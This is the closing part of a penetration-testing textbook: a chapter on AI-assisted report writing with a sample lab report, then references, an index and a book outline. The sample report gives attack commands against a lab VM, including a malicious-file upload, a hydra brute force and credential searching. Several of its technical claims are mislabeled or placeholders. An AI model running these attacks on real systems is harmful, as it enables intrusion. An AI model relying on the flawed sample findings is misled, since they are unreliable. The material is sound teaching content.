Based on the findings, vulnerabilities should be analyzed and classified into the following categories according to their severity: critical, high, medium, and low. Severity levels should be defined after discussing vulnerabilities with the target organization and considering vulnerabilities in the most business-critical components as the highest priority. Each vulnerability must be classified according to its severity. The scale used to qualify these vulnerabilities is as follows (Table 9.4).

Report-writing through GenIA tools

In this example, Generative AI can automate sections of the PT report based on inputs such

as scan results, identified vulnerabilities, and exploitation steps. By using AI-driven prompts, it can generate detailed findings, providing a cohesive narrative of the test process, while suggesting relevant remediation steps. The report’s structure can also be enhanced with

AI-generated recommendations, making it easier for clients to understand their vulnerabili-

ties and the necessary actions to mitigate risks. Additionally, AI can assist in summarizing complex technical details for non-technical stakeholders, improving overall communication

within the report.

Executive summary

The penetration test conducted on the “FestivalSecurity” virtual machine successfully identified and exploited several vulnerabilities within the system. The test targeted various entry points, including an exposed Telnet service, a vulnerable Apache server, and weak password

policies. Through this PT process, unauthorized access was gained, highlighting significant security weaknesses. Key findings included a lack of encryption on communication channels,

out-of-date software with known vulnerabilities, and poor user authentication practices. The vulnerabilities were exploited systematically, and successful root access was achieved.

Table 9.4 Vulnerability rating scale

Criticality level

Description

Example

CRITIQUE

Measures must be taken immediately

▪ Access to critical data Backdoor

to reduce the vulnerabilities of this

(Potential)

category.

▪ Exploitation read/write rights

Remote command execution

Database access

▪ Denial of Service

HIGH

Measures must be taken in the short

▪ Unencrypted access protocols

term to reduce vulnerabilities in this

▪ Disclosure of server parameters

category.

▪ Application errors

AVERAGE

Measures must be taken within a

▪ Services with a history of security

medium timeframe to reduce

breaches

vulnerabilities in this category.

▪ Use of reading rights

▪ Directory exploration

LOW

These are information notes on less

recommended practices, with no

proven impact on safety.





GenAI for automating and enhancing penetration testing reports 299

Test methodology

1. Initial Reconnaissance: The first scan revealed the Telnet service running on port 23, which was found to allow unauthenticated access. The initial user credentials, “guest”

and “guest123,” were discovered within the Telnet server logs, allowing further

exploration.

2. Service Enumeration: The Apache server running on port 80 was discovered to be running an outdated version of Apache with a known vulnerability (CVE-2021-XXXX).

The vulnerability was used to gain further access by exploiting an unauthenticated

remote code execution issue.

3. Directory Traversal Attack: The /uploads/ directory was found to be publicly accessible without proper validation of file types. A crafted file was uploaded and executed, which

resulted in a shell being initiated on the server.

4. Password Brute Force Attack: A password brute force attack was launched on the SSH

service, which revealed weak user passwords such as “1234” for user “bob.” Access

was gained to the user’s home directory, where private keys and configuration files were

discovered.

5. Privilege Escalation: The user “alice” was found to have sudo rights for unnecessary commands. A misconfigured script in /etc/cron.d/ was leveraged to escalate privileges to

root.

6. Token Extraction: Hidden authentication tokens were extracted from the compromised services and used to access a secondary server. The tokens were valid for 24 hours and

allowed further compromise of the internal network.

Detailed findings

1. Telnet Exploitation: The Telnet service on port 23 was accessed using the credentials found within the server logs. The command telnet 10.0.2.10 was issued, followed by

login with username “guest” and password “guest123.”

2. Apache Server Exploitation: The outdated version of Apache was exploited using the known vulnerability to execute arbitrary code. This was done by sending a specially

crafted HTTP request to the server using the following command:

nginx

CopierModifier

curl -X POST -d 'payload' http://10.0.2.10:80/exploit

3. Directory Traversal: The crafted payload file was uploaded to the /uploads/ directory using the following command:

nginx

CopierModifier

curl -X POST -F "file=@malicious.sh" http://10.0.2.10/uploads/

4. SSH Brute Force: Using Hydra, a brute force attack was executed against the SSH service with a custom wordlist to guess weak passwords. The successful login was achieved

with the following:

nginx

CopierModifier

hydra -l bob -P weak_passwords.txt ssh://10.0.2.10





300 Traditional vs Generative AI Pentesting

5. Privilege Escalation: The following sudo rights were identified for user “alice” via the command:

nginx

CopierModifier

sudo -l

A script in /etc/cron.d/ was created and executed to escalate privileges to root.

6. Token Extraction: The compromised SSH server contained hidden tokens in the .ssh/

authorized_keys file. These tokens were extracted using the following command:

bash

CopierModifier

cat ~/.ssh/authorized_keys | grep "token"

Recommendations

1. Disable Telnet: Telnet should be disabled on the system, and all services should be encrypted using SSH.

2. Patch Apache Server: The Apache server must be updated to the latest version to address known vulnerabilities.

3. Restrict File Uploads: Implement file type validation and restrictions on uploaded content to mitigate directory traversal and remote code execution.

4. Strengthen Password Policies: Enforce strong password policies to prevent brute force attacks. Consider multi-factor authentication for SSH.

5. Restrict Sudo Rights: Limit the sudo rights of users and restrict the execution of non-essential commands.

6. Regular Review of User Privileges: Perform regular reviews of user privileges and update permissions as necessary to prevent unauthorized access.

Conclusion

The penetration test on the “FestivalSecurity” virtual machine was successful in identifying and exploiting multiple vulnerabilities within the system. These included weak authentication mechanisms, outdated services, and misconfigurations that allowed for privilege escalation.

The provided recommendations should be implemented to strengthen the security posture of

the system, protect sensitive data, and reduce the risk of unauthorized access.

SUBMISSION OF PT REPORT

The final PT report should be hand-delivered to avoid unintentional access by third parties.

Here are a few points to bear in mind when handing in the test report

• Present the report in PDF format, which features robust security mechanisms and is

resistant to viruses, worms, and other malware.

• The printed report is the best format.

• Do not send the report to anyone who has not been trained to do so.

• Always deliver the report to the organization’s approved stakeholders in person.

• Avoid sending the report by e-mail or on CD-ROM.

• Always ask for a signed acknowledgment of receipt after submitting the report.

• Be available for 30 to 60 days after delivery of the report to answer any questions.





GenAI for automating and enhancing penetration testing reports 301

REPORT RETENTION

Penetration test information is sensitive and confidential. Keep it only for a certain period (usually 30 to 60 days).

Penetration test reports contain sensitive information about the organization, such as net-

work infrastructure, database architecture, vulnerability and exploit data, and sensitive storage data, which can lead to data loss and make it accessible to an unintentional third party.

After submitting the report, the organization can ask the assessor to clarify doubts, raise questions, or discuss the processes. Having a copy of the report will help the organization substantiate its claims and explain the processes to the client. However, it is advisable to keep the report only for a certain length (usually 30 to 60 days), which can be determined in advance by the organization. During this period, the tester or test team will be fully responsible for the security of the report and for answering the customer’s questions.

All retained test and report information must be destroyed at the end of the predetermined

period. Organizations generally determine the duration and deletion process for test reports and other information in the engagement contract.

CLOSING DOCUMENT

The closing document refers to an end-of-contract letter that both parties are invited to sign at the end of the PT process. This document will mark the end of the contract between the

organizations and release the test team from its many testing-related responsibilities. Testers can send an invoice for the PT work at this stage.

CONCLUSION

In this chapter, we have provided a comprehensive understanding of the components that

make up a PT report, emphasizing the importance of clear communication and strategic

presentation of findings. You are now equipped to generate PT reports tailored for both

management and technical teams, taking into account their distinct needs and expectations.

Through the use of Generative AI-powered tools, you have gained practical experience in

documenting the results of an intrusion test efficiently, ensuring that both technical details and actionable insights are captured effectively. Moreover, we have explored how Generative AI can assist in synthesizing recommendations for improving a client’s security posture, guiding them toward implementing the necessary measures to mitigate risks and vulnerabilities.

With this knowledge, you are now better positioned to deliver PT reports that not only

fulfill technical requirements but also resonate with clients, enabling them to take informed actions to bolster their defenses. The integration of AI into the reporting process represents a transformative shift, making the creation of clear, comprehensive, and actionable PT reports more efficient and impactful than ever before.

REFERENCES

Al Shebli, H. M. Z., & Beheshti, B. D. (2018). A study on penetration testing process and tools. 2018

IEEE Long Island Systems, Applications and Technology Conference (LISAT), 1–7.

Alghamdi, A. A. (2021). Effective penetration testing report writing. 2021 International Conference on

Electrical, Computer, Communications and Mechatronics Engineering (ICECCME), 1–5.

Baloch, R. (2017). Ethical hacking and penetration testing guide. Auerbach Publications.

302 Traditional vs Generative AI Pentesting

Hankin, C., & Malacaria, P. (2022). Attack dynamics: an automatic attack graph generation framework

based on system topology, CAPEC, CWE, and CVE databases. Computers & Security, 123, 102938.

Messier, R., & Messier, R. (2016). Reporting. Penetration Testing Basics: A Quick-Start Guide to

Breaking into Systems, 103–110.

Scarfone, K., & Mell, P. (2009). An analysis of CVSS version 2 vulnerability scoring. 2009 3rd

International Symposium on Empirical Software Engineering and Measurement, 516–525.

Svensson, R. (2016). From Hacking to Report Writing An Introduction to Security and Penetration

Testing. Springer.

Wilbanks, L., Kuhn, R., & Chou, W. (2014). IT risks. IT Professional, 16(1), 20–21.

Zakaria, M. N., Phin, P. A., Mohmad, N., Ismail, S. A., Kama, M. N., & Yusop, O. (2019). A review of

standardization for penetration testing reports and documents. 2019 6th International Conference

on Research and Innovation in Information Systems (ICRIIS), 1–5.

Zhang, L., Taal, A., Cushing, R., de Laat, C., & Grosso, P. (2022). A risk-level assessment system based

on the STRIDE/DREAD model for digital data marketplaces. International Journal of Information

Security, 1–17.





Index

Pages in italics refer to figures and pages in bold refer to tables.

AI-driven penetration testing, 27–28

DNSdumpster, 95, 97

APTs, 21–22, 31

DREAD, 293

artificial intelligence, 1–2, 30, 59, 99, 117, 176,

dumping, 263–264

217

attack, viii, 3, 6, 9–10, 15–16, 19, 21–22, 26–30,

elevation of privilege, 21, 220, 257, 268–270,

42, 51–52, 68, 82, 103, 121–122, 128,

277–278

145–147, 173, 184–186, 188, 191, 192, enumeration, 14, 51, 68, 93, 95–96, 103, 110,

193, 196–197, 199, 219–221, 223–224,

148, 166, 269–274, 275, 291, 299

226, 231, 236, 241–242, 254, 257, 261, escalation, 9, 13, 25, 44, 223, 255, 257–259,

265, 281, 291, 293–294, 296, 299

261, 263, 265, 267, 269, 271, 273–274,

audit, 1, 3–4, 13, 15, 103–104, 114, 203, 280

275, 277, 279, 281, 283, 285, 287, 289,

291, 297, 300

backdoor, 19–20, 191, 231, 235–239, 257, ethical considerations, 27, 29–30

280–282, 291, 296, 298

ethical hacking, 4, 9–10, 50, 82, 183, 255, 257, bind shell, 221–222, 241, 253, 255

291

black-box, 5–6, 26

evaluation, 2–4, 8, 13, 16, 22, 26–27, 30, 36, 43,

brute force, 14, 67, 172, 255, 262, 299–300

45, 102, 224, 240, 298

Burp suite, 28, 30, 44

EVASION, 21, 24–25, 112, 225, 260

exploitation, 2, 4, 6, 8, 12, 14, 16–18, 20–21, ChatGPT, 27, 29–30, 45, 61, 93–95, 98, 104,

24, 26, 30, 44, 52, 63, 103, 119, 144,

110, 112, 114, 117–118, 175, 177, 215

146–148, 220–221, 223–224, 226, 255, cracking, 24, 138, 253, 257, 261–263, 268, 291

257–258, 260, 264, 268, 280, 269, 291,

cracking passwords, 263, 268

295, 298, 299

CVE, 67, 71, 144, 148, 166, 180, 293, 295, 299

exploiting vulnerabilities, 29, 31, 223

CVSS, 144, 148, 153, 159, 293

exploit-db, 57, 67, 149, 227, 229, 230

cyberattack, 1, 5, 19–20, 22, 29, 31

Cyber Kill Chain, 1, 19–20, 31

footprinting, 14, 50–53, 54, 55, 59, 61–62, cybersecurity, 1–2, 20, 22, 27, 43, 66, 82, 103,

100–101

142, 144–146, 148, 175, 181, 215, fingerprinting, 71, 104, 114

261, 292

framework, 1–3, 7, 9–10, 13, 16–17, 19–22, 26,

cyber threats, ix, 19, 21–22, 27, 30–31, 144–145

31, 41–42, 44–45, 50, 52–53, 73, 79,

82–83, 85, 119, 144, 148, 166, 191, database, 3, 20, 25, 40, 42–44, 50, 53, 57, 73,

208, 212, 214–215, 224–226, 231,

79, 87–89, 103, 120, 144, 147–149,

241–242, 247, 263, 283, 295–296

159, 164, 172–173, 178, 184, 228–229,

230, 231, 232, 234, 272, 279, 293,

GenAI, 27, 29–30, 49, 103, 144, 222, 236,

298, 301

274, 292

deepfake, 30, 217–219

Generative AI, 27, 29–31, 34, 44–45, 49, 257,

DLL, 24, 146, 226

291–292, 297–298, 301

DNS, 22, 26, 51–52, 63, 68–71, 83, 84, 87–90,

Google Dork, 57, 61–62, 229

92–93, 95–97, 101, 104, 120, 122, 128, Google hacking, 14, 42, 55, 57, 59–61, 102

130, 132– 133, 138, 224, 295

Gray-box, 6

303

304 Index

hacking, 4, 9–10, 14, 24, 29, 35, 42, 50, 55,

penetration testing, 1, 3–8, 10, 14, 26–28,

57, 59–61, 82, 102, 183, 191, 229,

30, 34–35, 41–45, 47, 49–51, 53,

253–255, 257, 291

68–69, 73, 82, 101, 103–104, 119, 142, hands-on, 219, 255

150–151, 183–184, 219–221, 227, 229, hash, 25, 166, 262–264, 268, 279–282, 287–289,

242, 253–255, 257, 264, 267, 269,

291, 296–297

291–292, 301

pentesting, viii, 5–7, 10, 26–28, 34–35, 37, 39,

information gathering, 8, 14, 22, 29, 41, 43,

41–45, 47, 50–51, 53, 55, 57, 59, 61,

52–53, 63, 83, 103, 147, 272, 295

63, 65, 67–69, 71, 73, 75, 77, 79,

intrusion, 7, 9, 15, 26, 51, 66, 98, 261, 301

81–83, 85, 87, 89, 91, 93, 95, 97, 99,

ISSAF, 16–17

101, 103–104, 119, 142, 150–151,

183–185, 187, 189, 191, 193, 195, 197,

Large Language Models, 27, 297

199, 201, 203, 205, 207, 209, 211, 213, lateral movement, 257, 265, 279, 291

215, 217, 221, 227, 229, 253–254, 257,

LLMs, 27, 30, 297

264, 267, 292–293, 295, 297, 299, 301

persistence, 20–21, 24, 257, 268, 280–282, 291, Kali Linux, 34–37, 38, 39–41, 45, 49, 73, 80,

297

123, 135, 150, 160, 193, 196, 220, 227, phishing, 7, 21, 24, 27, 29–30, 64–67, 183,

235, 284, 295

185–186, 187, 189–191, 193–194,

196–197, 198, 199, 202–203, 206–216, Maltego, 22, 85, 86, 87, 102

219, 279–280, 294

metasploit, 26, 34, 36, 39, 44, 68–69, 71, 110, pivoting, 221, 227, 258, 261, 265

111, 119, 134, 156, 159, 220, 224–226, port forwarding, 167, 265–267

229, 231, 234–238, 240–243, 246–248, post-exploitation, 8, 14–15, 17, 21, 24, 26, 44,

251–253, 255, 257, 259, 264–266,

221, 226, 257–258, 260, 264, 291

282–283, 291, 295–296

privilege escalation, 13, 25, 44, 223, 255, 257, meterpreter, 25, 223–224, 226–227, 248, 252,

273–274, 282, 291, 297, 299–300

258–259, 263–266, 283–284, 286, 287

prompt, 45, 59–62, 94–96, 98–100, 110,

Mimikatz, 25, 257, 264, 280–282, 284, 286,

112–114, 117–118, 138, 142, 146,

287–288, 290–291

174–175, 177–178, 179, 183, 215–216, MITRE ATT&CK, 1, 20–22, 23, 24, 31

236, 246–247, 250, 252–254, 282–284, msfvenom, 225, 242–244, 245, 248, 253–255,

285, 287–288, 296

261, 281–282

PTES, 1, 14–15

PT reports, 292, 301

Nessus, 30, 43, 45, 49, 104, 144, 148–153, 155,

174, 181

rapid, 144, 156–159, 181, 229–231

Netcraft, 63–64, 199, 200, 202

reverse shell, 191, 221–222, 241–243, 253,

Nikto, 43, 144, 164, 170, 171, 172–173,

281–283

175–178

risk, 1–3, 8, 12, 17, 20–22, 27–28, 30–31, 50, 73, NIST, 16, 21, 31

100, 144–146, 159, 181, 183, 190–191,

NMAP, 30, 41–43, 45, 49, 68–70, 104–110,

199, 219, 221, 227, 258, 260–264, 280,

112–115, 142, 149, 174, 176–178,

293, 296–298, 300–301

231, 233, 240, 277, 295

risk assessment, 180, 293

non-staged payload, 223, 255

Nslookup, 90, 91, 92

scan, 2–3, 6, 8, 10, 14, 16, 22, 25–26, 28–29, 41,

NVD, 144, 148

43–45, 51, 53, 69, 77, 81–82, 103–119,

142, 148–149, 151–153, 155, 156–160, OpenVAS, 43, 45, 144, 159–162, 163, 164,

164–170, 172–181, 224–225, 233, 240,

165, 181

253, 295, 298–299

OSINT, 21, 42, 50, 53, 64, 68, 73, 79, 82–83,

scanning, 2–3, 8, 10, 14, 16, 22, 25, 28–29, 43,

84, 87, 99–100, 103, 185

69, 77, 103–105, 107, 109–110, 111,

OSSTMM, 12–13, 31

113–119, 121, 123, 125, 127, 127, 129,

OWASP, 1, 17–19, 43–44, 166, 168, 169–170,

131, 133, 135, 137, 139, 141–142, 150,

181

152, 159, 166, 172, 174–178, 180–181,

219, 224, 233, 253, 295

payload, 19–20, 25, 191, 222–226, 236, 238,

script, 24, 41–42, 69, 89, 93, 100–101, 107,

242–244, 245, 247–248, 249, 253–255,

109–110, 114, 138, 177–178, 193, 240,

257–258, 260, 264, 281–283, 291, 293,

281–282, 299–300

299

setoolkit, 191

Index 305

Shodan, 71, 72, 74

threat modeling, 14, 17

SMB, 103, 120, 239–241, 259

TTPs, 7, 21–22, 24

SMiShing, 189–190

sniffing, 103, 105, 107, 109, 111, 113, 115, 117,

vishing, 185

119–123, 125, 127, 127, 129, 131, 133, vulnerability assessment, 1–4, 12, 14, 17, 29,

135, 137, 139, 141, 142, 219

43, 102, 104, 142, 144–145, 147–149, social engineering, 2, 6–7, 10, 12, 17, 21, 25,

159, 169, 175, 177–178, 180–181, 224,

27, 29–30, 55, 88, 183, 185–191, 192,

295–296

194–196, 198, 200, 202, 204, 206, 208,

210, 212, 214, 216, 218, 220, 225, 281

white-box, 6, 26

SQL injection, 18, 29, 43–44, 166, 178, 293, 296

Wireshark, 104, 123–131, 132, 134–138, 139,

SSH, 104, 254–255, 258, 261, 263, 265–267,

141, 142

299–300

wordpress, 172–174, 194, 197, 228

staged payload, 223, 255

WPscan, 149, 172–174





Document Outline


Cover

Half Title

Title Page

Copyright Page

Dedication

Table of Contents

Preface

About the author

Chapter 1: Foundations of pentesting: Methodologies, frameworks, and AI integration Introduction What is PT?

Benefits of conducting a PT

Comparison of security audit vulnerability assessment and PT Pentesting vs ethical hacking

Pentesting benefits

PT strategies

Black-box penetration testing

White-box penetration testing

Gray-box penetration testing

Pentesting vs red teaming





Common areas of penetration testing

PT process

Code of good practice

Legal framework: Rules of Engagement (RoE)

Legal framework: Non-disclosure agreement (NDA)

Understanding the restrictions

Characteristics of a good PT

When should a PT be conducted?

Pentester ethics

PT methodologies

OSSTMM methodology Phase I: Regulatory

Phase II: Definitions

Phase III: Information phase

Phase IV: Interactive control test phase Advantages

Limits





PTES methodology





The stages of the PTES methodology Pre-commitment interactions

Information gathering

Threat modeling

Vulnerability analysis

Operation

Post-op

Reports Benefits

Limits





NIST methodology SP 800-115

The ISSAF (Information Systems Security Assessment Framework)

OWASP methodology

The OWASP phases Benefits of OWASP

Limits of OWASP

Cyber kill chain methodology

MITRE ATT&CK Adversary profile

Contribution of MITRE

Tools for pentesting according to MITRE ATT&CK





Challenges in penetration testing

AI-driven penetration testing Key features of AI-driven penetration testing

Benefits of AI-driven penetration testing

Tools for AI-driven penetration testing





Challenges and ethical considerations Overreliance on AI

Ethical and legal concerns

Inherent bias in AI models

Skill gap in using AI tools





Risks associated with generative AI in penetration testing Escalation of cyber threats

Advanced persistent threats (APTs)

Autonomous and self-propagating attacks

Uncontrolled AI development





Conclusion

References





Chapter 2: Building a modern penetration testing lab with generative AI Technical requirements

Set up a virtual PT laboratory

Your security

Understanding virtualization technology

Target machines Metasploitable 2 Step 1: Download and install VirtualBox on your PC

Step 2: Install Kali Linux on VirtualBox





Kali Linux basic commands

PT tools

PT platform

Information gathering

Vulnerability scanner Nessus and Openvas Web application testing platforms Examples of training platforms





Generative AI in penetration testing





Conclusion

References





Chapter 3: GenAI-driven reconnaissance for effective penetration testing Reconnaissance Objectives of reconnaissance and footprinting

Types of footprinting Passive footprinting Methods of Passive Footprinting:





Active footprinting Methods of active footprinting





Importance of reconnaissance

Types of information collected during footprinting Organizational information

Network information

System information





Footprinting methodology Key sources for information gathering

Methodological approach





Footprinting through search engines Information extracted through search engines

Applications in footprinting

Google Example of using google operators





Metasearch engines

Footprinting using advanced Google hacking techniques with AI Example of AI-powered Google hacking

Advanced Google hacking with shell command





VPN footprinting through Google hacking Automating VPN footprinting with AI





NetCraft: Website search engine

Social media Example: LinkedIn

Example: Facebook





OSINT automation tools Finding the target’s domain and subdomains





Fingerprinting the target using Shodan Recon-ng: An OSINT tool Web

TheHarvester

Metagoofil (http://www.edge-security.com)

SpiderFoot: An OSINT tool recognition





OSINT framework





Maltego: A framework for collecting information

OSINT with DNS querying Perform Whois lookups APNIC Whois lookup (source: https://www.oonic.net)

ARIN WhOIS.RIS (source: http://whois.arin.net)

Dnsenum (https://github.com)





Nslookup (source: https://docs.microsoft.com) What does a non-authoritative answer mean?





Lookup DNS records for the domain

Reverse domain name search Find a website’s domain name from its IP address





Finding a company’s Top-Level Domains (TLDs) and subdomains with AI Example 1: Enumerate subdomains with Sublist3r





Reverse DNS Lookup

Performing DNS enumeration with DNSRecon

DNSdumpster

Draw a network diagram using traceroute analysis

Traceroute Example of AI-enhanced tracerouting





AI-powered OSINT tools Key use cases of AI in OSINT

Benefits of AI in OSINT Notable AI-powered OSINT tools





Footprinting using AI script

Automating domain footprinting with AI





Documentation of result

Conclusion

References





Chapter 4: GenAI-enhanced scanning and sniffing Introduction

Nmap: Network mapper Installation of Nmap Installing on Linux

Installation on Windows

Install on macOS





Using Nmap Basic syntax

Examples of use





Scan options

Output options

Identification options

Port options

Attack options

Examples of advanced use Nmap: TCP Connect Scan sT

Nmap: TCP SYN Scan sS (Stealth)

Nmap: UDP Scan sU

Nmap: The scripts

NMAP: Examples





NMAP Scanning with AI Example #1

Example #2

Example #3

Example #4





Firewall Evasion Example





Nmap to fragment Example





Script to automate network scanning tasks with AI

Hping3 Key features

Advanced applications

Syntax

Hping commands

Hping Scan with AI

Example 2





Metasploit

Network sniffing How a sniffer works

Types of sniffing Sniffing passive

Sniffing active





Protocols vulnerable to sniffing





Get Wireshark Demer's Wireshark





Packet color coding

Packet filtering in Wireshark

Attack and defend with Wireshark How do you catch a network scan attack?

How do I detect running local services (accessible to the web)?





Creating firewall rules Packet capture

HTTP traffic

Traffic FTP

Traffic HTTPS





Conclusion

References





Chapter 5: Vulnerability assessment: Tools, techniques, and GenAI integration Introduction

Background Vulnerability

Vulnerability classification





Vulnerability research

What is vulnerability assessment? Characteristics of a good vulnerability assessment solution





Vulnerability assessment systems and databases Types of scanners

General-purpose scanners Web application scanners

Specific application scanners

Scanner types by authentication Unauthenticated scanners

Authenticated scanners

Agent-based scanners





Resources for vulnerability research

Vulnerability assessment tools Nessus Installation

Scan console

Start a scan

Run a basic scan

Run a web scan

Web Scan Results (Figure 5.9)





Rapid7 Nexpo Running Vulnerability Scanning





OpenVAS

Nikto (Source: https://cirt.net) Characteristics





OWASP Zap (https://www.zaproxy.org) Automated scanning

Alerts

Generate a report

Scan web servers and applications for vulnerabilities using Nikto

Scan wordpress sites with WPscan

Wordpress scan through AI





Vulnerability assessment using AI Example usage

Explanation

Explanation

Vulnerability scanning using Nmap with AI

Command example

Vulnerability assessment using Python script and AI Concept and approach





Skipfish vulnerability scanning with AI

Database vulnerability assessment





Vulnerability assessment reports Structure of vulnerability assessment reports

Components of a vulnerability assessment report

Classification of reports





Conclusion

References





Chapter 6: AI-driven social engineering and penetration testing Introduction

Social engineering concepts PT by social engineering: An overview Black box or white box test?





Types of social engineering Human-based social engineering

Computer-based social engineering





Example of social engineering by e-mail Mobile-based social engineering





Methods of influence

The importance of phishing campaigns

Phishing tools

Launch a phishing campaign

Social engineering using different techniques The social engineering toolkit

Using setoolkit for attacks phishing





Socialphish phishing Installation

Uses





Detecting a phishing attack Objectives of the Lab Detecting phishing with Netcraft

Detecting phishing with PhishTank





Audit organization’s security for phishing attacks Gophish (​https://​getgophish.​com)





Creating phishing emails with ChatGPT Handwriting style for identity theft

Writing style for identity theft (example)





Identity theft using AI: Creation of Deepfake videos Purpose of Deepfakes

Technologies and tools used





Conclusion

References





Chapter 7: GenAI-driven exploitation testing techniques Technical requirements Why consider exploiting a target machine during a test?

Reverse vs bind shell

Staged vs non-staged payloads

Exploiting vulnerabilities: Categories of exploits

Exploiting vulnerabilities Metasploit

Useful Metasploit user interfaces

Metasploit modules

Meterpreter

Basic commands in Meterpreter Process commands

File System Commands

Networking Commands

User Interface Functionalities

Feat-db: searchsploit

Find modules

Feat-DB

Rapid7 exploits database

0day.today





Preparing the Metasploit environment Identifying the target of the attack

Identify the target’s vulnerabilities

Vsftpd Backdoor v2.3.4





Launch attacks using the Metasploit framework Exploit FTP Backdoor through GenAI

Exploit with the UnreaIRCD IRC backdoor

Metasploit options, shells, and payloads

Feat SMB on Windows via EternalBlue

Finding a vulnerable target

Find a module to use

Shells

Verify that the target is compromised

Lab: Penetration testing with Metasploit

Exploit Steps





Payload and exploit generation

Perform system hacking using ShellGPT

Generate a payload





Conclusion





References





Chapter 8: Post-exploitation techniques and AI-driven privilege escalation Introduction

Post-exploitation techniques

File transfer techniques: Push vs pull File transfer services

Alternative methods for file transfer

Alternative file transfer methods





Looting files

File transfer

Evasion tactics

Pivoting and cracking The primacy of passwords

Password guessing vs. password cracking

Synchronized passwords Dictionaries for password cracking





Improving speed in password cracking

Passwords without cracking

Attention to information leaks

Best practices for handling passwords

Post-test analysis and reporting

Dumping hashes with Meterpreter

Dumping credentials with Mimikatz

Why pivot?

Pivoting using metasploit’s route command SSH local port forwarding

SSH remote port forwarding

SSH dynamic port forwarding

Port forwarding via a Meterpreter session

Meterpreter sessions via MSF route

SSH local and dynamic port forwarding





Cracking passwords with John the ripper

Multithreaded and GPU cracking with Hashcat

Elevation of privilege

Elevation of privilege: The enumeration User enumeration





Elevation of privilege: The enumeration Host name enumeration

Enumerating the OS version and architecture

Automating enumeration with GENAI tools





Exploit kernel vulnerabilities through AI Identify the kernel version





Elevation of privilege: sudo

Elevation of privilege: SUID/GUID Search and use of SUID files





SUID Example of SUID operation





Lateral movements Example 1





Persistence Backdoor

Example 2: Creating a backdoor with msfvenom

Example 3: Sticky keys persistence

Example 4: Automating the process with a script





Privilege escalation to collect the Hashdump using Mimikatz

Conclusion

References





Chapter 9: GenAI for automating and enhancing penetration testing reports Introduction

Risk ranking

General findings

Strategic roadmap

Technical report

Tools used Information gathering





Vulnerability assessment and exploitation

Post-op

Conclusion

Appendices

Use Case: Automating PT reports with generative AI and Dradis Pentest findings

Evaluation of findings

Report-writing through GenIA tools

Executive summary

Test methodology

Detailed findings

Recommendations

Conclusion





Submission of PT report

Report retention

Closing document

Conclusion

References





Index





